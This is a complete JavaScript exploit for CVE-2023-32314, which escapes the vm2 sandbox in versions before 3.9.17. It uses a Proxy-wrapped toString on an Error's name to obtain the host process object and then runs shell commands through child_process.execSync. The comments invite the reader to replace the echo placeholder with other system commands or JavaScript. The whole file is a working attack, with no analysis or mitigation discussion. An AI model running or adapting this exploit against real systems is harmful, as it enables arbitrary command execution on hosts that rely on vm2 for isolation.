
//version<3.9.17
//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32314
//echo write malicious code in return process
//Modify the command string in the execSync function to execute system instructions
//modify 'return process' to execute other JavaScript code

const { VM } = require("vm2-3-9-14");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo write malicious code in return process").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); 